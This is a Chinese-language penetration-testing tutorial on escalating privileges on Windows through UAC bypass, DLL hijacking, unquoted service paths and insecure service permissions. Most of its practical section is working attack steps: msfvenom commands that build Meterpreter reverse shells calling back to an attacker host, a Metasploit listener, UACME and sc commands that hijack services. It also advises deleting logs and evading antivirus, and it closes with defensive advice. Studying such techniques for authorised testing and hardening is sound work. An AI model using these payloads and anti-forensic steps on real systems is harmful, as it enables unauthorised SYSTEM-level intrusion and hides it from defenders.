@@ -1,0 +1,199 @@
+## 1. 概述
+
+在渗透测试和红队行动中，初始访问通常只能获得一个低权限的 Shell。为了在目标系统上执行更敏感的操作（如安装持久化后门、转储凭证、横向移动到域内其他主机），权限提升是至关重要的一个环节。本文档详细阐述了在 Windows 环境下，从本地普通用户权限提升至高权限（如管理员或 SYSTEM）的四种核心技术：**BypassUAC**、**DLL 劫持**、**未引号的服务路径**以及**不安全的服务权限**。
+
+本文档旨在提供一份兼具理论深度与实战价值的技术指南，适用于网络安全研究人员、渗透测试工程师以及希望加固系统安全性的系统管理员。
+
+**应用场景：**
+
+1.  **后渗透阶段**：当通过钓鱼攻击等手段获得目标主机的初始访问权限后，利用本文技术获取更高权限，以便进行深度控制和权限维持。
+2.  **内网渗透**：在获得内网中某台主机的立足点后，通过提权来收集更多凭证和信息，为后续的内网漫游和攻击域控做准备。
+
+## 2. 技术原理
+
+### 2.1 BypassUAC (用户账户控制绕过)
+
+**用户账户控制 (UAC)** 是 Windows Vista 及之后版本引入的一项安全机制。它要求程序在执行需要管理员级别权限的操作前，必须弹窗并获得用户的明确批准。然而，由于 Windows 自身架构的复杂性和一些“白名单”机制的存在，攻击者可以利用特定的系统程序（如 `fodhelper.exe`, `eventvwr.exe` 等）在不触发 UAC 弹窗的情况下，以高权限执行恶意代码。
+
+### 2.2 DLL 劫持 (DLL Hijacking)
+
+Windows 应用程序在启动时会加载一系列动态链接库 (DLL) 文件。操作系统会按照一个预定义的顺序搜索这些 DLL。如果程序尝试加载的某个 DLL 在其预期位置不存在，但搜索路径中某个更靠前的、且普通用户可写的目录下存在同名恶意 DLL，那么程序就会加载这个恶意的 DLL，从而以该程序的权限执行恶意代码。如果该程序本身以高权限运行，攻击者就能实现权限提升。
+
+**DLL 搜索顺序通常如下：**
+1.  应用程序加载的目录。
+2.  系统目录 `C:\Windows\System32`。
+3.  16位系统目录 `C:\Windows\System`。
+4.  Windows 目录 `C:\Windows`。
+5.  当前工作目录 (Current Working Directory, CWD)。
+6.  `PATH` 环境变量中列出的目录（先系统变量，后用户变量）。
+
+### 2.3 未引号的服务路径 (Unquoted Service Path)
+
+当一个服务的可执行文件路径包含空格且没有被引号包裹时，就会产生此漏洞。例如，路径为 `C:\Program Files\Some Dir\service.exe`。当系统尝试启动此服务时，它会依次尝试执行以下路径：
+1.  `C:\Program.exe`
+2.  `C:\Program Files\Some.exe`
+3.  `C:\Program Files\Some Dir\service.exe`
+
+如果攻击者能在 `C:\` 目录下放置一个名为 `Program.exe` 的恶意程序，并且拥有相应的写入权限，那么系统在启动服务时就会优先执行这个恶意程序，通常是以 SYSTEM 权限。
+
+### 2.4 不安全的服务权限 (Insecure Service Permissions)
+
+此漏洞源于服务本身的访问控制列表 (ACL) 配置不当。如果一个低权限用户被授予了修改某个高权限服务（如以 SYSTEM 权限运行的服务）配置的权限（例如 `SERVICE_CHANGE_CONFIG`），攻击者就可以直接修改该服务的 `binPath`（可执行文件路径），将其指向一个恶意程序，然后重启服务以执行恶意代码，从而实现提权。
+
+## 3. 环境准备
+
+在进行实战演练前，请确保你拥有一个安全的、隔离的实验环境（如虚拟机）。
+
+- **攻击机 (Kali Linux / Parrot OS)**：
+  - Metasploit Framework
+  - `msfvenom` 载荷生成工具
+- **靶机 (Windows 10 / Windows Server)**：
+  - 存在漏洞配置的测试环境
+  - 辅助工具（用于检测）：
+    - **AccessChk**: 来自 Sysinternals 套件，用于检查服务权限。
+    - **UACME**: 强大的 BypassUAC 开源项目。
+    - **PEASS-ng**: 综合性的权限提升枚举脚本。
+    - **火绒剑 / Process Monitor**: 用于监控进程行为，分析 DLL 加载情况。
+
+## 4. 实战示例
+
+### 4.1 BypassUAC - 使用 UACME 项目
+
+**UACME** 是一个集成了数十种 UAC 绕过方法的开源项目，是目前最全面、最有效的工具之一。
+
+**攻击流程：**
+
+1.  **生成恶意载荷**：在攻击机上，使用 `msfvenom` 生成一个反向 Shell 的 `exe` 文件。
+
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
+    ```
+
+2.  **准备 MSF 监听**：在 Metasploit 中设置监听器。
+
+    ```ruby
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lhost 192.168.1.10
+    set lport 4444
+    run
+    ```
+
+3.  **上传文件**：将 `shell.exe` 和 UACME 的执行文件（如 `Akagi64.exe`）上传到靶机的可写目录（如 `C:\Users\Public\`）。
+
+4.  **执行绕过**：在靶机的低权限 cmd 中，使用 UACME 调用恶意载荷。`Akagi64.exe` 后面跟一个数字代表不同的绕过方法编号。
+
+    ```powershell
+    # 假设使用编号为 34 的方法 (fodhelper.exe)
+    C:\Users\Public\Akagi64.exe 34 C:\Users\Public\shell.exe
+    ```
+
+5.  **获取高权限 Shell**：执行后，攻击机的 MSF 监听器将收到一个高权限的 Meterpreter 会话，`getuid` 查看将是管理员或更高权限。
+
+### 4.2 DLL 劫持提权
+
+**攻击流程：**
+
+1.  **信息收集**：使用工具（如火绒剑、Process Monitor）或自动化脚本在靶机上寻找一个以高权限运行且存在 DLL 劫持漏洞的应用程序。重点关注那些尝试从用户可写目录加载 DLL 的程序。
+
+2.  **制作恶意 DLL**：假设我们发现 `VulnerableApp.exe` 会尝试加载一个不存在的 `hijack.dll`。我们使用 `msfvenom` 生成恶意的 DLL。
+
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 -f dll -o hijack.dll
+    ```
+
+3.  **上传并替换 DLL**：将生成的 `hijack.dll` 上传到 `VulnerableApp.exe` 搜索 DLL 的优先路径中（例如，如果它先搜索自己的目录，就放在该目录下）。
+
+4.  **等待触发**：等待该应用程序被启动或重启。一旦 `VulnerableApp.exe` 启动，它会加载我们的恶意 `hijack.dll`，攻击机将收到一个继承了该应用权限的 Meterpreter 会话。
+
+### 4.3 未引号的服务路径
+
+**攻击流程：**
+
+1.  **检测漏洞服务**：在靶机上执行以下命令，查找所有自动启动且路径未被引号包裹的服务。
+
+    ```powershell
+    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+    ```
+    > **命令解释**：
+    > - `wmic service ...`: 获取服务信息。
+    > - `findstr /i "Auto"`: 筛选出启动模式为 "Auto" 的服务。
+    > - `findstr /i /v "C:\Windows\\"`: 排除系统核心服务，减少干扰。
+    > - `findstr /i /v """`: 排除路径中已经包含引号的服务。
+
+2.  **制作并上传文件**：假设发现一个服务路径为 `C:\Program Files\Vulnerable Service\service.exe`。我们在攻击机上生成一个名为 `Program.exe` 的恶意文件，并上传到靶机的 `C:\` 根目录。
+
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=6666 -f exe -o Program.exe
+    ```
+
+3.  **触发服务**：重启该服务或等待系统重启。当服务启动时，系统会优先执行 `C:\Program.exe`。
+
+    ```powershell
+    # 尝试重启服务
+    sc stop "Vulnerable Service"
+    sc start "Vulnerable Service"
+    ```
+
+4.  **获取 SYSTEM Shell**：攻击机将收到一个 SYSTEM 权限的会话。
+
+### 4.4 不安全的服务权限
+
+**攻击流程：**
+
+1.  **检测服务权限配置**：使用 `accesschk.exe` 检查当前用户对哪些服务拥有修改权限。
+
+    ```powershell
+    # 检查当前用户对所有服务的权限
+    accesschk.exe /accepteula -uwcqv %USERNAME% *
+    ```
+    > 寻找输出中包含 `SERVICE_CHANGE_CONFIG` 或 `SERVICE_ALL_ACCESS` 的服务。
+
+2.  **制作并上传文件**：假设发现当前用户可以修改名为 `InsecureSvc` 的服务。我们生成一个恶意 `exe` 并上传到靶机（如 `C:\Temp\evil.exe`）。
+
+3.  **更改服务路径指向**：使用 `sc` 命令修改服务的二进制路径，使其指向我们的恶意程序。
+
+    ```powershell
+    sc config "InsecureSvc" binpath= "C:\Temp\evil.exe"
+    ```
+
+4.  **调用服务**：启动服务以执行恶意代码。
+
+    ```powershell
+    sc start "InsecureSvc"
+    ```
+
+5.  **获取 SYSTEM Shell**：攻击机将收到一个 SYSTEM 权限的会话。成功后，记得将服务路径改回，以避免留下痕迹。
+
+## 5. 关键细节
+
+- **自动化检测**：手动检查耗时耗力。在实战中，应优先使用自动化脚本如 **WinPEAS** 来快速枚举所有潜在的提权向量。
+  ```powershell
+  # 执行 WinPEAS 并将结果保存到文件
+  winPEASany.exe quiet file=result.txt
+  ```
+- **架构匹配**：确保你生成的载荷（`x86` 或 `x64`）与目标进程或操作系统的架构相匹配，否则将执行失败。
+- **环境清理**：提权成功后，务必清理上传的文件、恢复修改的服务配置，并删除日志记录，以减少被发现的风险。
+- **杀软规避**：本文中生成的载aho 载荷很容易被现代 EDR/AV 查杀。在真实环境中，需要对载荷进行免杀处理。
+
+## 6. 安全总结与防御建议
+
+权限提升是攻击链中的关键节点，有效的防御可以极大地增加攻击者的难度。
+
+- **BypassUAC 防御**：
+  - **设置最高 UAC 级别**：在组策略中将 UAC 设置为“始终通知”，但这可能会影响用户体验。
+  - **用户权限最小化**：不要为日常用户分配本地管理员权限。
+
+- **DLL 劫持防御**：
+  - **安全编码**：开发者应在代码中为 DLL 加载指定绝对路径，而不是依赖于模糊的搜索顺序。
+  - **监控文件创建**：在敏感目录（如 `System32`）中监控异常的 DLL 文件创建行为。
+
+- **服务路径漏洞防御**：
+  - **始终使用引号**：确保所有服务路径，特别是包含空格的路径，都被英文双引号包裹。
+  - **定期审计**：定期运行脚本检查系统中是否存在未加引号的服务路径。
+
+- **不安全的服务权限防御**：
+  - **权限最小化原则**：确保普通用户和服务账户对系统服务只有其必需的最小权限。
+  - **定期审计 ACL**：使用 `accesschk` 等工具定期审计服务权限配置，确保没有被错误地赋予过多权限。
+
+通过理解这些攻击的原理并采取相应的防御措施，可以显著提升 Windows 系统的整体安全性。
